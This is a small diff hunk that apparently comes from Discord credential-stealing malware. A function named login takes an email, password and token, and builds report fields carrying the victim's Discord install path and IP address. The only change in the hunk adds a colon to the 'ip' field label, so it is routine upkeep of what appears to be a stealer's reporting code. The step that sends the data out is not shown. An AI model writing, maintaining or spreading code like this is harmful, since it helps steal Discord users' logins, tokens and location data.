@@ -608,7 +608,7 @@ function login(email, password, token) {
                                                     value: `\`\`\`${discordInstall}\n\`\`\``,
                                                     inline: !1
                                                 }, {
-                                                    name: "ip",
+                                                    name: "ip:",
                                                     value: `\`${ip}\``,
                                                     inline: !0
                                                 }, {
